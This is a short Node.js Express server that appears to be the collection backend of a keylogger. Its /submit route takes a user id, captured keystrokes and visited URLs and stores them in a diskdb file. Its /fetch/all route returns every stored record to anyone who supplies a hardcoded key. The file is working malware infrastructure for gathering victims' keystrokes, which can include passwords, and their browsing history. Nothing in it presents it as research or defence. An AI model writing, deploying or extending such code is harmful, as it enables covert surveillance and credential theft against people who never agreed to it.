
var port = 8080;
var db = require('diskdb');
var express = require('express');
var app = express();
var router = express.Router();
var bodyparser = require('body-parser');
var key = '7thi5i5s0mek3y!!';

db = db.connect('db/', ['data']);
app.use(bodyparser.json());

router.get('/', (req,res)=>{
    res.json({message:'working'});
});

router.post('/submit', (req,res)=>{
    res.json({status:'success'});
    console.log(req.body);
    var uid = req.body.uid;
    var keypress = req.body.keypress;
    var urls = req.body.urls;
    var odatabase = db.data.find({uid:uid})[0];
    if(odatabase !== undefined){
       if(urls.length > 0){
          urls.forEach(function(i){
          odatabase.urls.push(i);
         });
      }
      odatabase.keypress += keypress;
      db.data.update({uid:uid}, {keypress:odatabase.keypress, urls:odatabase.urls}, {multi:true,upsert:true});
      console.log('DB Updated');
    }
    else {
       db.data.save({uid:uid, keypress:keypress, urls:urls});
    }
});


router.post('/fetch/all', (req,res)=>{
    if(req.body.key != key) {
       res.json({status:'not allowed'});
    }
    else {
       res.json(db.data.find());
   }
    
    

});

app.use('/', router);
app.listen(port);

